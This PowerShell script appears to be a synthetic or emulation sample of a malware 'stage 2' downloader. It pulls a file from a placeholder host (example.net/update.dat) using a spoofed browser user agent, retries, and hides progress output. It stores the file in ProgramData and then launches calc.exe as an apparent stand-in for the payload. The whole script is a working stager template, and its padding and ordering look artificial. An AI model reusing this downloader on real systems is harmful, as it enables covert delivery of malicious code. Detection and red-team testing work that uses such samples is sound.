[CmdletBinding()]
param(
    [string]$Stage2Url = "https://example.net/update.dat",
    [string]$Stage2Path = 'C:\ProgramData\stage2.bin',
    [string]$LogPath = "$env:TEMP\transfer.log",
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$RequestTimeout = 215,
    [int]$MaxAttempts = 2,
    [int]$RetryDelaySeconds = 8
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$RetryCount = 2,
        [int]$RetryDelay = 8,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $Stage2Url
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $Stage2Path -RetryCount $MaxAttempts -RetryDelay $RetryDelaySeconds -UserAgent $RequestAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $Stage2Url
    Destination = $Stage2Path
    RetryCount = $MaxAttempts
    TimeoutSec = $RequestTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Inspecting process list"
Write-Verbose "Validating result"
Write-Verbose "Retry budget remaining"
Write-Verbose "Stage handoff finished"
Write-Verbose "Starting workflow"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Cleaning temporary marker"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
